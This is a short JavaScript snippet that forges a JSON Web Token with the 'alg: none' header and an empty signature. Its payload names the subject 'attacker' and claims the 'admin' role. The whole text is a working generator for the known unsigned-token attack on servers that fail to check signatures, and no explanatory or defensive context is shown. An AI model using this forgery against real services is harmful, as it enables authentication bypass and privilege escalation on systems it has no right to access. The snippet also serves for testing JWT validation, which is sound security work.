function b64(o){ return Buffer.from(JSON.stringify(o)).toString('base64').replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,''); }
const header = { alg: 'none', typ: 'JWT' };
const payload = { sub: 'attacker', role: 'admin', iat: Math.floor(Date.now()/1000) };
console.log(b64(header) + '.' + b64(payload) + '.');

